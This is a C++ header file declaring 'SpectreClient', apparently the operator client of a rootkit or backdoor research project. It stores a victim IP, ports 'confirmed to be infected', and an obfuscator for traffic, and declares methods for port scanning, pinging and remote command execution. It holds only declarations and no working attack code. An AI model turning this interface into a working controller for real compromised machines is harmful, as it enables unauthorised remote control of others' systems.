/*
 * This file is subject to the terms and conditions defined in
 * file 'LICENSE', which is part of this source code package.
 *
 * COPYRIGHT Bill Demirkapi 2020
 */
#pragma once
#include "common.h"
#include "SocketClient.h"
#include "PacketObfuscator.h"
#include "Configuration.h"

//
// Timeout for Ping requests (in ms).
//
#define PING_RECEIVE_TIMEOUT 500
//
// Timeout for Command requests (in ms).
//
#define COMMAND_RECEIVE_TIMEOUT 30000

typedef class SpectreClient
{
	BOOLEAN WriteConfirmedPorts (
		VOID
		);
	//
	// The IP Address of the victim machine.
	//
	std::string TargetIPAddress;
	//
	// The ports on the target machine to attempt to connect to.
	//
	std::vector<std::string> Ports;
	//
	// The ports that have been confirmed to be infected.
	//
	std::vector<std::string> ConfirmedPorts;
	//
	// The socket client used for communication.
	//
	PSOCKET_CLIENT TargetSocket;
	//
	// The obfuscator used to send packets.
	//
	PPACKET_OBFUSCATOR Obfuscator;
	//
	// The config instance used for a variety of values.
	//
	PCONFIGURATION Configuration;
public:
	SpectreClient (
		_In_ PCONFIGURATION Config
		);
	~SpectreClient (
		VOID
		);
	
	BOOLEAN InitializeConfig (
		VOID
		);
	BOOLEAN ScanPorts (
		VOID
		);
	BOOLEAN Ping (
		_In_ std::string Port
		);
	std::string ExecuteCommand (
		_In_ std::wstring Command
		);
} SPECTRE_CLIENT, *PSPECTRE_CLIENT;